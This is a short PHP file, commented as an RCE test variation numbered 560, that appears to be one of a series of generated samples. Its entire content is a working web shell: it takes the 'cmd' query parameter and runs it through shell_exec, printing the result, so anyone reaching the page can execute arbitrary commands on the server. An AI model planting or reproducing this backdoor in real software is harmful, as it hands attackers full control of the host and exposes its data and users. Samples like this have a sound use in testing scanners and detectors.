<?php
// RCE test variation #560
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>